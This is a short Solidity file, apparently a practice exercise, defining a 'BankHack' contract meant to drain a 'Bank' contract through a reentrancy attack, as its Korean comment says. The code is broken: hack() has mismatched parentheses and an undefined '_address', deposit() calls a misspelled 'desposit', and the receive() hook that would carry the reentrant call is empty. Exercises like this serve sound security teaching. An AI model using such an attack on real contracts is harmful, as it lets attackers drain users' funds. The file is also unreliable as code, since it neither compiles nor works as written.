// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import { Bank } from "../src/Bank.sol";


contract BankHack {
    Bank public bank;   
    
    constructor(address _bank) {
        bank = Bank(_bank);
    }
    function hack() public {
        bank.withdraw(bank.balanceOf((_address(this)));)
    }
    function deposit() public payable {
        bank.desposit{value: msg.value}();
    }
    function withdraw() public {
        payable(msg.sender).call{value: address(this).balance}("");
    }
    receive() external payable{
        //재진입공격
    }
}